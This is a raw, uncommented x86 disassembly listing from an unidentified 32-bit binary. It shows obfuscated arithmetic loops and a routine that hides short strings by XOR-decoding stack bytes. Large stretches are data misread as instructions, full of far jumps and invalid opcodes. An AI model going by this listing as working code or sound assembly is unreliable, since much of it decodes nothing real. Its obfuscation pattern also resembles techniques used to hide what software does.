  41c8e5:	jae    0x41c86c
  41c8e7:	inc    ebp
  41c8e8:	fdiv   QWORD PTR [edi-0x32722d96]
  41c8ee:	mov    ecx,0xa1bd1c
  41c8f3:	push   edi
  41c8f4:	outs   dx,DWORD PTR ds:[esi]
  41c8f5:	pop    esp
  41c8f6:	dec    ebp
  41c8f7:	mov    dh,0x44
  41c8f9:	jmp    0x36fe:0x5a4c8847
  41c900:	mov    ds:0x803f6071,eax
  41c905:	rol    BYTE PTR [ebx+0x19],1
  41c908:	pop    ecx
  41c909:	xchg   ecx,eax
  41c90a:	shl    DWORD PTR [edx],cl
  41c90c:	inc    eax
  41c90d:	dec    esi
  41c90e:	mov    BYTE PTR [eax+0x18],ah
  41c911:	cdq    
  41c912:	loopne 0x41c8f1
  41c914:	pop    ecx
  41c915:	pop    ecx
  41c916:	and    DWORD PTR [ecx+0x3d1480f1],edx
  41c91c:	ins    BYTE PTR es:[edi],dx
  41c91d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c91e:	in     al,dx
  41c91f:	inc    edx
  41c920:	sar    BYTE PTR ds:0x68849042,1
  41c926:	test   al,0xfa
  41c928:	jbe    0x41c96c
  41c92a:	xchg   esp,eax
  41c92b:	xchg   ebx,eax
  41c92c:	and    dh,BYTE PTR [ebx-0x4ac2d196]
  41c932:	in     al,0xb8
  41c934:	mov    edx,DWORD PTR [ecx]
  41c936:	dec    ebx
  41c937:	push   ss
  41c938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c939:	mov    dl,0xdf
  41c93b:	push   esp
  41c93c:	ja     0x41c949
  41c93e:	push   es
  41c93f:	lods   al,BYTE PTR ds:[esi]
  41c940:	jg     0x41c931
  41c942:	jecxz  0x41c946
  41c944:	iret   
  41c945:	test   BYTE PTR [edi+0x1244288f],bl
  41c94b:	repz int 0x26
  41c94e:	mov    ah,0x67
  41c950:	mov    edi,edi
  41c952:	imul   BYTE PTR [eax+0x2d849a49]
  41c958:	sub    eax,DWORD PTR [esi-0x63667c5c]
  41c95e:	lahf   
  41c95f:	pop    ecx
  41c960:	xchg   ebp,eax
  41c961:	dec    esp
  41c962:	xchg   ebp,eax
  41c963:	add    BYTE PTR [bx+di],bl
  41c966:	pop    ecx
  41c967:	xchg   ebx,eax
  41c968:	and    DWORD PTR fs:[edx-0x5],0x7e98e11e
  41c970:	jbe    0x41c8f4
  41c972:	mov    eax,0xe5360db9
  41c977:	or     al,0x90
  41c979:	mov    eax,ds:0x4a37f46a
  41c97e:	xor    eax,0x44111c18
  41c983:	in     al,dx
  41c984:	(bad)  [ebx-0x37]
  41c987:	mov    ds:0x7347ca52,al
  41c98c:	jp     0x41c9f3
  41c98e:	pop    esp
  41c98f:	dec    edx
  41c990:	adc    bh,ch
  41c992:	fcomi  st,st(5)
  41c994:	(bad)  
  41c995:	pop    ds
  41c996:	xchg   edx,eax
  41c997:	mov    edx,0xbca1c546
  41c99c:	shl    BYTE PTR ds:0xc1039677,cl
  41c9a2:	fsubr  DWORD PTR [ebx+0x43]
  41c9a5:	fadd   QWORD PTR [ecx]
  41c9a7:	xor    ch,BYTE PTR [edx]
  41c9a9:	bound  ebp,QWORD PTR [esi]
  41c9ab:	push   es
  41c9ac:	pop    eax
  41c9ad:	arpl   WORD PTR [ebp-0x7d],si
  41c9b0:	pop    ecx
  41c9b1:	popf   
  41c9b2:	or     eax,0x9f7c4d95
  41c9b7:	cmp    ch,bh
  41c9b9:	aaa    
  41c9ba:	fnstsw WORD PTR [ebp+0x19]
  41c9bd:	scas   al,BYTE PTR es:[edi]
  41c9be:	aaa    
  41c9bf:	mov    ds:0x4a9152a3,eax
  41c9c4:	xchg   ecx,eax
  41c9c5:	loop   0x41ca12
  41c9c7:	jle    0x41c9c5
  41c9c9:	and    eax,0xe7465816
  41c9ce:	mov    esi,0x7f2aff7b
  41c9d3:	imul   eax,edx,0xffffffc2
  41c9d6:	mov    bh,0x5a
  41c9d8:	and    ecx,ecx
  41c9da:	dec    eax
  41c9db:	leave  
  41c9dc:	xor    eax,0x6a3125ac
  41c9e1:	pop    DWORD PTR [ebx+ebp*2-0x2eb2eb98]
  41c9e8:	inc    ebx
  41c9e9:	add    DWORD PTR [eax-0x5ee37d7a],edi
  41c9ef:	mov    ecx,0xc34ca434
  41c9f4:	jge    0x41c9d3
  41c9f6:	inc    edx
  41c9f7:	mov    ah,0x91
  41c9f9:	xchg   esi,eax
  41c9fa:	cmp    DWORD PTR [edi+eax*1+0x7c18f7d7],ebp
  41ca01:	inc    esp
  41ca02:	mov    cl,0x68
  41ca04:	sub    al,0x6b
  41ca06:	test   BYTE PTR [eax-0x2d44db81],cl
  41ca0c:	loopne 0x41ca0d
  41ca0e:	repnz sbb al,BYTE PTR ss:[edx-0x3d]
  41ca13:	sti    
  41ca14:	fdivr  QWORD PTR [edx-0x38]
  41ca17:	or     ebx,DWORD PTR [edx+0x11227ef8]
  41ca1d:	stos   BYTE PTR es:[edi],al
  41ca1e:	or     ah,bl
  41ca20:	mov    ecx,0x10f7258b
  41ca25:	adc    al,0x9c
  41ca27:	jne    0x41ca98
  41ca29:	adc    ecx,edx
  41ca2b:	jbe    0x41caa6
  41ca2d:	pop    ebp
  41ca2e:	outs   dx,DWORD PTR ds:[esi]
  41ca2f:	fld    DWORD PTR [esi-0x50e4dee8]
  41ca35:	enter  0xce58,0x1c
  41ca39:	lock retf 0x5682
  41ca3d:	xchg   esi,eax
  41ca3e:	das    
  41ca3f:	fs das 
  41ca41:	mov    al,bh
  41ca43:	icebp  
  41ca44:	xchg   BYTE PTR [ecx-0x3d],bl
  41ca47:	enter  0xd3b8,0xe5
  41ca4b:	xchg   esp,eax
  41ca4c:	cmp    bl,BYTE PTR [ebp-0x55]
  41ca4f:	imul   esi,esp,0x4f
  41ca52:	cmp    DWORD PTR [ebx-0x21],esp
  41ca55:	xchg   BYTE PTR [ecx+0x76085fdc],dh
  41ca5b:	std    
  41ca5c:	mov    eax,0xdec70f02
  41ca61:	mov    BYTE PTR [ebx+0x4c543a1c],al
  41ca67:	jmp    0x94c7:0x447e82d7
  41ca6e:	mov    edi,0x87e3d5b8
  41ca73:	adc    eax,0x6c911763
  41ca78:	into   
  41ca79:	add    ebp,DWORD PTR [edx+0x5]
  41ca7c:	and    eax,ebx
  41ca7e:	jnp    0x41cabb
  41ca80:	push   ds
  41ca81:	inc    eax
  41ca82:	test   al,0x8f
  41ca84:	aad    0x94
  41ca86:	mov    dl,0xc9
  41ca88:	fidiv  WORD PTR [eax-0x36]
  41ca8b:	test   BYTE PTR [eax-0x1d],bh
  41ca8e:	sub    al,0x9c
  41ca90:	ins    BYTE PTR es:[edi],dx
  41ca91:	out    dx,al
  41ca92:	sub    esp,DWORD PTR [eax-0x94ad439]
  41ca98:	mov    edi,0x4035f4ab
  41ca9d:	cmp    edi,DWORD PTR [eax-0x5110d6b0]
  41caa3:	out    0x30,eax
  41caa5:	dec    eax
  41caa6:	sub    BYTE PTR [eax],cl
  41caa8:	es mov eax,0x40fc584
  41caae:	or     esi,esi
  41cab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cab1:	jecxz  0x41cb24
  41cab3:	daa    
  41cab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cab5:	in     al,dx
  41cab6:	cdq    
  41cab7:	mov    cl,0xf1
  41cab9:	(bad)  
  41caba:	ins    BYTE PTR es:[edi],dx
  41cabb:	inc    ebp
  41cabc:	push   edi
  41cabd:	adc    bh,BYTE PTR [esi+0x66]
  41cac0:	jge    0x41ca53
  41cac2:	cmc    
  41cac3:	loop   0x41ca71
  41cac5:	xor    ch,BYTE PTR [esi+0x6a]
  41cac8:	mov    ds:0x4f873af,al
  41cacd:	push   esi
  41cace:	mov    ?,WORD PTR [edx+0x6e]
  41cad1:	gs icebp 
  41cad3:	aas    
  41cad4:	cmp    al,0xc7
  41cad6:	or     cl,cl
  41cad8:	inc    ebp
  41cad9:	leave  
  41cada:	and    eax,0xf7528925
  41cadf:	jnp    0x41cb5f
  41cae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cae2:	jge    0x41cb01
  41cae4:	adc    BYTE PTR [edi+0x75fca740],bh
  41caea:	outs   dx,BYTE PTR ds:[esi]
  41caeb:	sbb    al,cl
  41caed:	jbe    0x41cb6c
  41caef:	mov    esi,0xc7c7fd4e
  41caf5:	sbb    al,0x16
  41caf7:	pushf  
  41caf8:	jmp    0xccb2:0xfefd1d32
  41caff:	into   
  41cb00:	add    eax,0xb03ee98c
  41cb05:	dec    ecx
  41cb06:	or     DWORD PTR [ebp+0x1d],ebx
  41cb09:	jb     0x41cb3e
  41cb0b:	addr16 and al,0xb7
  41cb0e:	push   es
  41cb0f:	xchg   edx,eax
  41cb10:	sbb    edi,DWORD PTR [ebx+0xd06ec9b]
  41cb16:	xor    BYTE PTR [esi-0x7c3564cb],0xb1
  41cb1d:	inc    edi
  41cb1e:	dec    edx
  41cb1f:	and    BYTE PTR [edx],bl
  41cb21:	cdq    
  41cb22:	xchg   ecx,eax
  41cb23:	jo     0x41cae3
  41cb25:	je     0x41cb4b
  41cb27:	retf   0x2364
  41cb2a:	mov    al,0x32
  41cb2c:	shr    BYTE PTR [ecx-0x36af0349],1
  41cb32:	arpl   WORD PTR [edx+0x6c],sp
  41cb35:	cmp    ebp,DWORD PTR [ebx+eax*2+0x61]
  41cb39:	push   ecx
  41cb3a:	mov    ch,BYTE PTR [ecx-0x6c3e288]
  41cb40:	dec    esi
  41cb41:	sti    
  41cb42:	aam    0x4
  41cb44:	retf   0x1cc9
  41cb47:	jle    0x41cae1
  41cb49:	jmp    0x17e93e2a
  41cb4e:	(bad)  
  41cb4f:	sbb    bl,BYTE PTR [ebx-0x5d]
  41cb52:	push   edx
  41cb53:	mov    ch,0xdf
  41cb55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb56:	aad    0x17
  41cb58:	jp     0x41cbca
  41cb5a:	loop   0x41cb0c
  41cb5c:	sub    ah,cl
  41cb5e:	mov    eax,ds:0x234e4c38
  41cb63:	ror    DWORD PTR [ecx+0x558bb455],cl
  41cb69:	or     BYTE PTR [ebx-0x6b7247a3],cl
  41cb6f:	adc    ebx,DWORD PTR [edi]
  41cb71:	cld    
  41cb72:	inc    ecx
  41cb73:	add    cl,BYTE PTR [ecx+0x558bb855]
  41cb79:	or     BYTE PTR [ebx-0x5a1ea1e],bh
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	(bad)  
  41ce45:	sti    
  41ce46:	xor    edx,DWORD PTR [ebx+0x4277b2e8]
  41ce4c:	mov    bl,0xfb
  41ce4e:	aas    
  41ce4f:	xchg   edi,eax
  41ce50:	hlt    
  41ce51:	les    edx,FWORD PTR [ebx+ebp*2+0x1]
  41ce58:	inc    ebx
  41ce59:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41ce5d:	jb     0x41ced1
  41ce5f:	outs   dx,BYTE PTR gs:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
